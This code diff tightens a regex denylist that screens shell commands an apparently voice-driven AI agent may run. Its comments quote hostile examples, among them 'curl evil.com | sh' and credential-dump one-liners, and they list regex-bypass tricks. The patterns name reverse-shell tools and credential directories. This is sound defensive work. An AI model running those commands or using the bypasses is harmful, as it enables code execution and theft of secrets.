@@ -397,12 +397,18 @@ function isInside(candidate: string, root: string): boolean {
   return candidate.startsWith(rootWithSep)
 }
 
-// Day-one denylist. Pattern-matched on the raw command string before exec —
-// not a security boundary against a determined adversary, only a guard
-// against a voice misfire nuking the machine.
+// Bash safety guardrail — NOT a security boundary. A determined adversary with
+// shell access has too many ways around any regex (quoting, env aliases,
+// hex/octal escapes, $(printf ...), python -c "...", etc.). The real boundary
+// is authentication (RELAY_API_KEY) plus the future sandbox. This denylist
+// catches:
+//   - voice misfires ("delete everything" → rm -r)
+//   - obvious prompt-injection payloads (curl evil.com | sh, eval base64-blob)
+//   - dumb credential-exfil one-liners (env > /tmp/x, find / -name id_rsa)
 //
-// The patterns are intentionally conservative: false positives are cheap (the
-// model can rephrase), false negatives are expensive.
+// Patterns are intentionally conservative. We normalize backslash-escapes from
+// the raw string ("\s\u\d\o" → "sudo") before matching so a single class of
+// shell-quote bypasses doesn't render the regexes useless.
 const BASH_DENY_PATTERNS: { re: RegExp, reason: string }[] = [
   {
     re: /(^|\s|;|&&|\|\||\||`|\$\()\s*sudo(\s|$)/i,
@@ -424,7 +430,7 @@ const BASH_DENY_PATTERNS: { re: RegExp, reason: string }[] = [
   },
   {
     // touch credential dirs
-    re: /(~|\$HOME|\/Users\/[^\s/]+|\/home\/[^\s/]+)\/(\.ssh|\.aws|\.gnupg|\.config\/gh|\.config\/op)\b/i,
+    re: /(~|\$HOME|\/Users\/[^\s/]+|\/home\/[^\s/]+)\/(\.ssh|\.aws|\.gnupg|\.config\/gh|\.config\/op|\.config\/gcloud|\.kube|\.docker)\b/i,
     reason: "credential directories are not allowed",
   },
   {
@@ -436,6 +442,48 @@ const BASH_DENY_PATTERNS: { re: RegExp, reason: string }[] = [
     re: /(^|\s|;|&&|\|\||`|\$\()\s*dd\s+if=/i,
     reason: "dd write commands are not allowed",
   },
+  {
+    // shell-c re-exec — common prompt-injection / decode-and-run pattern.
+    re: /(^|\s|;|&&|\|\||\||`|\$\()\s*(bash|sh|zsh|ksh|fish|dash)\s+-c\b/,
+    reason: "shell -c re-exec is not allowed (use the command directly)",
+  },
+  {
+    // eval / exec of arbitrary strings.
+    re: /(^|\s|;|&&|\|\||\||`|\$\()\s*eval(\s|$)/,
+    reason: "eval is not allowed",
+  },
+  {
+    // base64 / xxd decode (typical encoded-payload trick).
+    re: /\bbase64\s+(-d|--decode|-D)\b/,
+    reason: "base64 -d is not allowed (decode + exec is a common injection pattern)",
+  },
+  {
+    re: /\bxxd\s+-r\b/,
+    reason: "xxd -r is not allowed (decode + exec is a common injection pattern)",
+  },
+  {
+    // find ... -exec / -delete — arbitrary-command-per-result is the same
+    // hazard as rm -r and a classic credential-scan pattern.
+    re: /\bfind\b[^|;]*\s+-(exec|execdir|delete)\b/,
+    reason: "find -exec / -delete is not allowed (use targeted commands instead)",
+  },
+  {
+    // env / printenv dump entire environment, which includes provider keys.
+    // The honest fix here is env scrubbing in the spawn, but the cheap fix is
+    // to refuse the trivial one-liner.
+    re: /(^|\s|;|&&|\|\||\||`|\$\()\s*(env|printenv)(\s|$)/,
+    reason: "env / printenv is not allowed (would dump provider keys)",
+  },
+  {
+    // network listeners / arbitrary sockets — common reverse-shell payloads.
+    re: /(^|\s|;|&&|\|\||\||`|\$\()\s*(nc|ncat|netcat|socat)(\s|$)/,
+    reason: "nc / socat is not allowed (reverse-shell footgun)",
+  },
+  {
+    // chmod 777 / world-writable bits.
+    re: /\bchmod\s+(-R\s+)?[0-7]*7[0-7]*7\b/,
+    reason: "chmod with world-writable bits is not allowed",
+  },
 ]
 
 export interface BashCheckOk { ok: true }
@@ -446,8 +494,12 @@ export function checkBashCommand(command: string): BashCheckResult {
   if (typeof command !== "string" || command.trim().length === 0) {
     return { ok: false, reason: "command is empty" }
   }
+  // Normalize raw backslash-escapes: \s\u\d\o, c\at, r\m, etc. The shell drops
+  // a single leading backslash before any alpha char, so "s\udo" parses as
+  // "sudo". Strip those before matching so the literal-string regexes work.
+  const normalized = command.replace(/\\([a-zA-Z])/g, "$1")
   for (const { re, reason } of BASH_DENY_PATTERNS) {
-    if (re.test(command)) {
+    if (re.test(command) || re.test(normalized)) {
       return { ok: false, reason }
     }
   }
